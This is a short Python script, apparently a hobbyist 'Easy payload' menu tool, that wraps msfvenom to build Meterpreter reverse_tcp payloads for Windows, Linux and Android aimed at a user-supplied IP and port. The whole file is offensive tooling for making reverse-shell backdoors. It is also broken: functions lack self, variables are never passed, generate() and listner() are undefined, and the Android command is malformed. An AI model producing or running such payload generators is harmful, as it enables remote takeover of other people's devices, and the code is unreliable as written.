import os
import time

class payload:
	def __init__():
		op=raw_input("[1]Windows\n[2]Linux\n[3]Android")
		if op == 1:
			payload.windows()
		if op==2:
			payload.linux()
		if op==3:
			payload.android()
	def windows():
		op=raw_input('[1]reverse_tcp\n[2]back')
		if op == '1':
			os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > output/{filename}.exe')
		elif op == '2':
			easypayload()
	def linux():
		op=raw_input('[1]reverse_tcp\n[2]back')
		if op == '1':
			os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > output/{filename}.elf')
		elif op == '2':
			easypayload()

	def android():
		op=raw_input('[1]reverse_tcp\n[2]back')
		if op == '1':
			os.system(f'android/meterpreter/reverse_tcp LHOST=ip R > output/{filename}.apk')
		elif op == '2':
			easypayload()


def easypayload():
	os.system('clear')
	print('Easy payload:\nTo generate and execute metasploit, msfvenom easily')
	print('o--------------------------------o')
	print('Enter 1 to generate payload\nEnter 2 to start listner\nEnter 3 to cleanup backup folder')

	option = raw_input('[option]:')
	if option == '1':
		ip=raw_input('IP:')
		port=raw_input('Port:')
		port=int(port)
		filename=raw_input('Filename:')
		generate()
	elif option == '2':
		listner()
	elif option == '3':
		os.system('rm output/*')
		print('[+]Done')
		time.sleep(1)
	elif option == '4':
		print('doung')
		time.sleep(1)
		easypayload()
	else:
       		print('[-]Wrong option')
		time.sleep(1)

while True:
	easypayload() 
